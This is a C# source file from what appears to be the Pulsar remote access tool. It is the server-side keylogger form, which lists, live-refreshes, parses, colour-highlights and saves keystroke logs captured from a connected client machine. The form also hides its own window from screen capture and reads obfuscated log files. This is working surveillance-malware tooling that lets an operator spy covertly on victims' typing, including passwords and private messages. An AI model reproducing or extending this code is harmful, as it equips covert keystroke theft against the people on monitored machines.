using Pulsar.Common.Helpers;
using Pulsar.Common.Messages;
using Pulsar.Common.Messages.Monitoring.KeyLogger;
using Pulsar.Server.Forms.DarkMode;
using Pulsar.Server.Helper;
using Pulsar.Server.Messages;
using Pulsar.Server.Networking;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Pulsar.Server.Forms
{
    public partial class FrmKeylogger : Form
    {
        private readonly Client _connectClient;
        private readonly KeyloggerHandler _keyloggerHandler;
        private static readonly Dictionary<Client, FrmKeylogger> OpenedForms = new();

        private readonly Timer _autoRefreshTimer = new();
        private readonly object _contentLock = new();
        private StringBuilder _currentLogCache = new();
        private DateTime _lastRefreshTime = DateTime.MinValue;
        private readonly TimeSpan _minimumRefreshInterval = TimeSpan.FromMilliseconds(1000);

        private FileSystemWatcher _fileWatcher;
        private string _currentWatchedFile;

        public static FrmKeylogger CreateNewOrGetExisting(Client client)
        {
            if (OpenedForms.TryGetValue(client, out var form)) return form;

            form = new FrmKeylogger(client);
            form.Disposed += (s, e) => OpenedForms.Remove(client);
            OpenedForms.Add(client, form);
            return form;
        }

        public FrmKeylogger(Client client)
        {
            _connectClient = client ?? throw new ArgumentNullException(nameof(client));
            _keyloggerHandler = new KeyloggerHandler(client);

            InitializeComponent();
            DarkModeManager.ApplyDarkMode(this);
            ScreenCaptureHider.ScreenCaptureHider.Apply(this.Handle);

            RegisterMessageHandler();

            _autoRefreshTimer.Interval = 2000;
            _autoRefreshTimer.Tick += AutoRefreshTimer_Tick;

            InitializeFileWatcher();
        }

        private void InitializeFileWatcher()
        {
            _fileWatcher = new FileSystemWatcher
            {
                Path = Path.GetTempPath(),
                Filter = "*.txt",
                NotifyFilter = NotifyFilters.LastWrite | NotifyFilters.Size,
                EnableRaisingEvents = false
            };
            _fileWatcher.Changed += async (s, e) =>
            {
                if (e.FullPath == _currentWatchedFile)
                {
                    await Task.Delay(50); // ensure write completed
                    SafeInvoke(RefreshSelectedLog);
                }
            };
        }

        private void AutoRefreshTimer_Tick(object sender, EventArgs e)
        {
            if ((DateTime.UtcNow - _lastRefreshTime) < _minimumRefreshInterval) return;
            _lastRefreshTime = DateTime.UtcNow;

            if (checkBox1.Checked && lstLogs.SelectedItems.Count > 0)
                RefreshSelectedLog();
        }

        private void RegisterMessageHandler()
        {
            _connectClient.ClientState += ClientDisconnected;
            _keyloggerHandler.ProgressChanged += LogsChanged;
            MessageHandler.Register(_keyloggerHandler);
        }

        private void UnregisterMessageHandler()
        {
            MessageHandler.Unregister(_keyloggerHandler);
            _keyloggerHandler.ProgressChanged -= LogsChanged;
            _connectClient.ClientState -= ClientDisconnected;
        }

        private void ClientDisconnected(Client client, bool connected)
        {
            if (!connected) SafeInvoke(Close);
        }

        private void LogsChanged(object sender, string message) => SafeInvoke(RefreshLogsDirectory);

        private void FrmKeylogger_Load(object sender, EventArgs e)
        {
            Text = WindowHelper.GetWindowTitle("Keylogger", _connectClient);
            RefreshLogsDirectory();

            if (lstLogs.Items.Count > 0)
            {
                lstLogs.Items[0].Selected = true;
                lstLogs.Focus();
                UpdateFileWatcher();
                RefreshSelectedLog();
            }
        }

        private void FrmKeylogger_FormClosing(object sender, FormClosingEventArgs e)
        {
            UnregisterMessageHandler();
            _keyloggerHandler.Dispose();
            _fileWatcher?.Dispose();
            _autoRefreshTimer.Stop();
            _autoRefreshTimer.Dispose();
        }

        private void lstLogs_SelectedIndexChanged(object sender, EventArgs e)
        {
            if (lstLogs.SelectedItems.Count > 0)
            {
                UpdateFileWatcher();
                RefreshSelectedLog();
            }
        }

        private void lstLogs_ItemActivate(object sender, EventArgs e) => RefreshSelectedLog();

        private void UpdateFileWatcher()
        {
            if (lstLogs.SelectedItems.Count > 0)
            {
                _currentWatchedFile = Path.Combine(Path.GetTempPath(), lstLogs.SelectedItems[0].Text);
                _fileWatcher.EnableRaisingEvents = checkBox1.Checked;
            }
            else
            {
                _fileWatcher.EnableRaisingEvents = false;
            }
        }

        private void RefreshLogsDirectory()
        {
            SafeInvoke(() =>
            {
                string previous = lstLogs.SelectedItems.Count > 0 ? lstLogs.SelectedItems[0].Text : null;
                lstLogs.Items.Clear();

                try
                {
                    var validPattern = new Regex(@"^\d{4}-\d{2}-\d{2}(?:_\d{2})?\.txt$");
                    var files = new DirectoryInfo(Path.GetTempPath())
                        .GetFiles("*.txt")
                        .Where(f => validPattern.IsMatch(f.Name))
                        .OrderByDescending(f => f.LastWriteTime);

                    foreach (var f in files)
                        lstLogs.Items.Add(new ListViewItem(f.Name));

                    if (!string.IsNullOrEmpty(previous))
                    {
                        var item = lstLogs.Items.Cast<ListViewItem>().FirstOrDefault(i => i.Text == previous);
                        if (item != null) { item.Selected = true; lstLogs.Focus(); }
                    }
                    else if (lstLogs.Items.Count > 0) { lstLogs.Items[0].Selected = true; lstLogs.Focus(); }

                    UpdateFileWatcher();
                }
                catch (Exception ex)
                {
                    Debug.WriteLine($"Refresh logs error: {ex.Message}");
                }
            });
        }

        private void RefreshSelectedLog()
        {
            if (lstLogs.SelectedItems.Count == 0) return;

            string logFile = Path.Combine(Path.GetTempPath(), lstLogs.SelectedItems[0].Text);

            Task.Run(async () =>
            {
                try
                {
                    if (!File.Exists(logFile))
                    {
                        SafeInvoke(() =>
                        {
                            rtbLogViewer.Text = "Log file not found.";
                            ForceScrollToBottom();
                        });
                        return;
                    }

                    string content = await ReadFileWithRetryAsync(logFile);
                    if (content == null) return;

                    content = FilterAndDeduplicateLog(content);
                    content = MergeBrokenLines(content);
                    content = EnsureHeadersOnNewLine(content);

                    lock (_contentLock)
                    {
                        if (content != _currentLogCache.ToString())
                        {
                            _currentLogCache.Clear();
                            _currentLogCache.Append(content);

                            SafeInvoke(() =>
                            {
                                // Suspend layout to prevent visual jumps
                                rtbLogViewer.SuspendLayout();

                                rtbLogViewer.Text = _currentLogCache.ToString();
                                HighlightSpecialKeys();

                                // Aggressive scroll to bottom
                                rtbLogViewer.SelectionStart = rtbLogViewer.Text.Length;
                                rtbLogViewer.ScrollToCaret();

                                // Windows API call as backup
                                NativeMethods.SendMessage(rtbLogViewer.Handle, NativeMethods.WM_VSCROLL,
                                    (IntPtr)NativeMethods.SB_BOTTOM, IntPtr.Zero);

                                rtbLogViewer.ResumeLayout();
                            });
                        }
                        else
                        {
                            // Even when content doesn't change, ensure we're at bottom
                            SafeInvoke(ForceScrollToBottom);
                        }
                    }
                }
                catch (Exception ex)
                {
                    SafeInvoke(() =>
                    {
                        rtbLogViewer.Text = $"Error loading log: {ex.Message}";
                        ForceScrollToBottom();
                    });
                }
            });
        }

        // Add this method to your form
        private void ForceScrollToBottom()
        {
            if (rtbLogViewer.IsDisposed || !rtbLogViewer.IsHandleCreated)
                return;

            rtbLogViewer.SelectionStart = rtbLogViewer.Text.Length;
            rtbLogViewer.ScrollToCaret();
            NativeMethods.SendMessage(rtbLogViewer.Handle, NativeMethods.WM_VSCROLL,
                (IntPtr)NativeMethods.SB_BOTTOM, IntPtr.Zero);
        }

        // Add this class inside your FrmKeylogger class
        private static class NativeMethods
        {
            public const int WM_VSCROLL = 0x0115;
            public const int SB_BOTTOM = 7;

            [System.Runtime.InteropServices.DllImport("user32.dll")]
            public static extern IntPtr SendMessage(IntPtr hWnd, int msg, IntPtr wp, IntPtr lp);
        }
        private async Task<string> ReadFileWithRetryAsync(string path, int maxRetries = 3)
        {
            for (int i = 0; i < maxRetries; i++)
            {
                try { return await FileHelper.ReadObfuscatedLogFileAsync(path); }
                catch (IOException) when (i < maxRetries - 1) { await Task.Delay(50); }
            }
            return null;
        }

        // ------------------ LOG PROCESSING ------------------

        private string FilterAndDeduplicateLog(string content)
        {
            if (string.IsNullOrEmpty(content)) return content;

            var lines = content.Split(new[] { "\r\n", "\r", "\n" }, StringSplitOptions.None);
            var result = new List<string>();
            string lastLine = null;

            foreach (var line in lines)
            {
                string trimmed = Regex.Replace(line.Trim(), @"[ ]{2,}", " ");
                if (string.IsNullOrEmpty(trimmed)) continue;
                if (trimmed.StartsWith("Log created on") || trimmed.StartsWith("Session started at:") || trimmed.StartsWith("==="))
                    continue;

                if (trimmed != lastLine)
                {
                    result.Add(trimmed);
                    lastLine = trimmed;
                }
            }

            return string.Join(Environment.NewLine, result);
        }

        private string MergeBrokenLines(string content)
        {
            if (string.IsNullOrEmpty(content)) return content;

            var lines = content.Split(new[] { "\r\n", "\r", "\n" }, StringSplitOptions.None);
            var merged = new List<string>();
            string currentHeader = null;
            StringBuilder textBuffer = new();

            foreach (var line in lines)
            {
                string trimmed = line.Trim();
                if (string.IsNullOrEmpty(trimmed)) continue;

                if (IsTimestampHeader(trimmed))
                {
                    if (currentHeader != null && textBuffer.Length > 0)
                    {
                        merged.Add(currentHeader);
                        merged.Add(textBuffer.ToString().Trim());
                        textBuffer.Clear();
                    }
                    currentHeader = trimmed;
                }
                else if (IsSpecialKey(trimmed))
                {
                    if (textBuffer.Length > 0)
                    {
                        merged.Add(currentHeader);
                        merged.Add(textBuffer.ToString().Trim());
                        textBuffer.Clear();
                    }
                    merged.Add(currentHeader);
                    merged.Add(trimmed);
                }
                else
                {
                    if (textBuffer.Length > 0) textBuffer.Append(" ");
                    textBuffer.Append(trimmed);
                }
            }

            if (currentHeader != null)
            {
                if (textBuffer.Length > 0) merged.Add(currentHeader);
                merged.Add(textBuffer.ToString().Trim());
            }

            return string.Join(Environment.NewLine, merged);
        }

        private bool IsTimestampHeader(string line)
            => Regex.IsMatch(line, @"^\[\d{1,2}:\d{2}:\d{2}(?:\s?[AP]M)?\].*");

        private bool IsSpecialKey(string text)
        {
            if (Regex.IsMatch(text, @"^\[[^\]]+\]$")) return true;
            return text.StartsWith("[") && text.Contains("]") &&
                   !IsTimestampHeader(text) &&
                   (text.Contains("[Back]") || text.Contains("[Shift]") || text.Contains("[Enter]") ||
                    text.Contains("[Tab]") || text.Contains("[Esc]") || text.Contains("[Ctrl]"));
        }

        private string EnsureHeadersOnNewLine(string content)
        {
            if (string.IsNullOrEmpty(content)) return content;
            return Regex.Replace(content, @"(?<!\n)(\[\d{1,2}:\d{2}:\d{2}(?:\s?[AP]M)?\])", "\r\n$1");
        }

        private void HighlightSpecialKeys()
        {
            string text = rtbLogViewer.Text;
            rtbLogViewer.SuspendLayout();

            var headerRegex = new Regex(@"\[\d{1,2}:\d{2}:\d{2}(?:\s?[AP]M)?\].*", RegexOptions.Multiline);
            foreach (Match match in headerRegex.Matches(text))
            {
                rtbLogViewer.Select(match.Index, match.Length);
                rtbLogViewer.SelectionColor = Color.LimeGreen;
            }

            var specialKeyRegex = new Regex(@"\[[^\]]+\]");
            foreach (Match match in specialKeyRegex.Matches(text))
            {
                if (headerRegex.Matches(text).Cast<Match>().Any(h => match.Index >= h.Index && match.Index < h.Index + h.Length)) continue;
                rtbLogViewer.Select(match.Index, match.Length);
                rtbLogViewer.SelectionColor = Color.Gold;
            }

            rtbLogViewer.SelectionStart = rtbLogViewer.Text.Length;
            rtbLogViewer.SelectionColor = rtbLogViewer.ForeColor;
            rtbLogViewer.ResumeLayout();
        }

        private void SafeInvoke(Action action)
        {
            if (InvokeRequired) Invoke(action);
            else action();
        }

        // ---------------- UI button handlers ----------------
        private void button1_Click(object sender, EventArgs e) => _connectClient.Send(new GetKeyloggerLogsDirectory());
        private void btnGetLogs_Click(object sender, EventArgs e) => checkBox1_CheckedChanged_1(sender, e);

        private void checkBox1_CheckedChanged_1(object sender, EventArgs e)
        {
            if (checkBox1.Checked)
            {
                RefreshLogsDirectory();
                if (lstLogs.Items.Count > 0)
                {
                    lstLogs.Items[0].Selected = true;
                    lstLogs.Focus();
                    UpdateFileWatcher();
                    RefreshSelectedLog();
                }
                _autoRefreshTimer.Start();
                _fileWatcher.EnableRaisingEvents = true;
            }
            else
            {
                _autoRefreshTimer.Stop();
                _fileWatcher.EnableRaisingEvents = false;
            }
        }

        private void button2_Click(object sender, EventArgs e)
        {
            try
            {
                if (_currentLogCache.Length == 0)
                {
                    MessageBox.Show("No log to save.");
                    return;
                }

                string clientFolder = string.IsNullOrWhiteSpace(_connectClient.Value.DownloadDirectory)
                    ? Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "Clients", "UnknownClient")
                    : _connectClient.Value.DownloadDirectory;

                string saveDir = Path.Combine(clientFolder, "Keylogs");
                Directory.CreateDirectory(saveDir);

                string savePath = Path.Combine(saveDir, $"Keylog_{DateTime.Now:yyyy-MM-dd_HH-mm-ss}.txt");
                File.WriteAllText(savePath, _currentLogCache.ToString(), Encoding.UTF8);

                MessageBox.Show($"Log saved to {savePath}");
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Failed to save log: {ex.Message}");
            }
        }
    }
}
